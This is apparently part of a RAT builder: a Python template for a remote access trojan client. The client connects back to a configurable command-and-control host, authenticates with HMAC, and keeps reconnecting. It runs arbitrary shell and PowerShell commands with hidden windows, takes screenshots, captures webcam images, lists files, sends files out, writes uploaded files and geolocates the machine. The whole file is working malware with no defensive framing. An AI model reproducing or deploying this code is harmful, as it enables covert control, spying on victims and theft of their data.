CLIENT_TEMPLATE = '''\
import socket, subprocess, struct, json, base64, io, os, time, platform, threading, hmac, hashlib

_MODULES = {{}}
__MODULE_INJECT__

C2_HOST       = {c2_host!r}
C2_PORT       = {c2_port}
RETRY_DELAY   = {retry}
CLIENT_SECRET = {secret!r}

def _do_auth(sock):
    try:
        sock.settimeout(15)
        buf = b""
        while b"\\n" not in buf:
            chunk = sock.recv(128)
            if not chunk: return False
            buf += chunk
        nonce = bytes.fromhex(buf.strip().decode())
        mac   = hmac.new(CLIENT_SECRET, nonce, hashlib.sha256).digest()
        sock.sendall(base64.b64encode(mac) + b"\\n")
        sock.settimeout(None)
        return True
    except Exception:
        return False

def send_msg(sock, cmd, data=None):
    payload = json.dumps({{"cmd": cmd, "data": data}}).encode()
    sock.sendall(struct.pack(">I", len(payload)) + payload)

def recv_msg(sock):
    raw = _recvall(sock, 4)
    if not raw: return None
    raw = _recvall(sock, struct.unpack(">I", raw)[0])
    if not raw: return None
    try:
        return json.loads(raw.decode())
    except Exception:
        return None

def _recvall(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk: return None
        buf += chunk
    return buf

def handle_shell(payload):
    shell_type = payload.get("shell", "cmd")
    cmd        = payload.get("cmd", "")
    os_name    = platform.system()
    if shell_type == "cmd" and os_name == "Windows":
        args = ["cmd.exe", "/c", cmd]
    elif shell_type == "powershell" and os_name == "Windows":
        args = ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd]
    elif shell_type == "bash":
        args = ["bash", "-c", cmd]
    else:
        args = cmd if os_name == "Windows" else ["/bin/sh", "-c", cmd]
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=30,
                           creationflags=subprocess.CREATE_NO_WINDOW if os_name=="Windows" else 0)
        return (r.stdout + r.stderr) or "<no output>"
    except subprocess.TimeoutExpired: return "<timeout>"
    except FileNotFoundError as e:    return f"<shell not found: {{e}}>"
    except Exception as e:            return f"<error: {{e}}>"

def handle_screenshot():
    import tempfile
    errors = []
    def _run(cmd, stdin=None):
        try: return subprocess.run(cmd, capture_output=True, timeout=12, input=stdin)
        except FileNotFoundError: return None
        except Exception as e: errors.append(f"{{cmd[0]}}: {{e}}"); return None
    def _ok(r): return r is not None and r.returncode == 0
    def _wrap(data, method):
        if data and not _ss_is_black(data):
            return {{"data": base64.b64encode(data).decode(), "method": method}}
        if data: errors.append(f"{{method}}: black frame")
        return None
    def _ss_is_black(data):
        try:
            from PIL import Image as _I
            img = _I.open(io.BytesIO(data)).convert("L")
            raw = list(img.tobytes())
            return (sum(raw) / max(len(raw), 1)) < 3.0
        except Exception: return False
    with tempfile.TemporaryDirectory() as td:
        tmp = os.path.join(td, "ss.png")
        for tool, args in [
            ("grim",["grim",tmp]),("scrot",["scrot","-z",tmp]),
        ]:
            r = _run(args)
            if _ok(r) and os.path.exists(tmp):
                with open(tmp,"rb") as fh: data = fh.read()
                os.unlink(tmp)
                res = _wrap(data, tool)
                if res: return res
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab(); buf = io.BytesIO(); img.save(buf, format="PNG")
            res = _wrap(buf.getvalue(), "PIL.ImageGrab")
            if res: return res
        except Exception as e: errors.append(f"PIL.ImageGrab: {{e}}")
    return {{"data": None, "errors": errors}}

def handle_camera(payload):
    try:
        import cv2
        idx = int(payload.get("index", 0))
        cap = cv2.VideoCapture(idx)
        if not cap.isOpened(): return None
        deadline = time.time() + 3.0; frame = None
        while time.time() < deadline:
            ret, f = cap.read()
            if ret and f is not None and f.mean() > 2.0: frame = f; break
            time.sleep(0.05)
        cap.release()
        if frame is None: return None
        ok, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        return base64.b64encode(buf.tobytes()).decode() if ok else None
    except Exception: return None

def handle_listdir(payload):
    path = payload.get("path", ".")
    try:
        entries = []
        for e in sorted(os.scandir(path), key=lambda x: (not x.is_dir(), x.name.lower())):
            entries.append({{"name": e.name, "is_dir": e.is_dir(),
                             "size": e.stat().st_size if e.is_file() else 0, "path": e.path}})
        return {{"ok": True, "path": path, "entries": entries}}
    except Exception as ex:
        return {{"ok": False, "path": path, "error": str(ex), "entries": []}}

def handle_download(payload):
    path = payload.get("path","") if payload else ""
    if not path: return {{"ok": False, "error": "no path", "data": None}}
    try:
        with open(path,"rb") as fh:
            return {{"ok": True, "error": None, "data": base64.b64encode(fh.read()).decode()}}
    except Exception as e:
        return {{"ok": False, "error": str(e), "data": None}}

def handle_upload(payload):
    try:
        raw  = base64.b64decode(payload.get("data",""))
        path = payload.get("path","")
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        with open(path,"wb") as fh: fh.write(raw)
        return f"ok ({{len(raw)}} bytes)"
    except Exception as e: return f"error: {{e}}"

def handle_geolocate():
    try:
        import urllib.request
        with urllib.request.urlopen("https://ipinfo.io/json", timeout=6) as r:
            return json.loads(r.read().decode())
    except Exception as e1:
        try:
            r = subprocess.run(["curl","-s","--max-time","6","https://ipinfo.io/json"],
                               capture_output=True, text=True, timeout=10)
            return json.loads(r.stdout)
        except Exception as e2:
            return {{"error": f"urllib: could not connect  curl: {{e2}}"}}

def get_sysinfo():
    return {{
        "user": os.environ.get("USERNAME") or os.environ.get("USER") or "unknown",
        "os":   platform.system() + " " + platform.release(),
    }}

def dispatch(sock):
    send_msg(sock, "sysinfo", get_sysinfo())
    while True:
        msg = recv_msg(sock)
        if msg is None: break
        cmd  = msg.get("cmd")
        data = msg.get("data")
        if   cmd == "exit":       break
        elif cmd == "shell":      send_msg(sock, "shell_resp",      handle_shell(data))
        elif cmd == "screenshot":
            r = handle_screenshot()
            send_msg(sock, "screenshot_resp",
                     r if isinstance(r, dict) else {{"data": r, "method": "unknown"}})
        elif cmd == "camera":     send_msg(sock, "camera_resp",     handle_camera(data))
        elif cmd == "listdir":    send_msg(sock, "listdir_resp",    handle_listdir(data))
        elif cmd == "download":   send_msg(sock, "download_resp",   handle_download(data))
        elif cmd == "upload":     send_msg(sock, "upload_resp",     handle_upload(data))
        elif cmd == "geolocate":  send_msg(sock, "geo_resp",        handle_geolocate())
        else:                     send_msg(sock, "unknown_cmd",     f"unknown: {{cmd}}")

def run():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((C2_HOST, C2_PORT))
            if not _do_auth(sock): sock.close(); time.sleep(RETRY_DELAY); continue
            dispatch(sock)
        except Exception: pass
        finally:
            try: sock.close()
            except Exception: pass
        time.sleep(RETRY_DELAY)

if __name__ == "__main__":
    run()
'''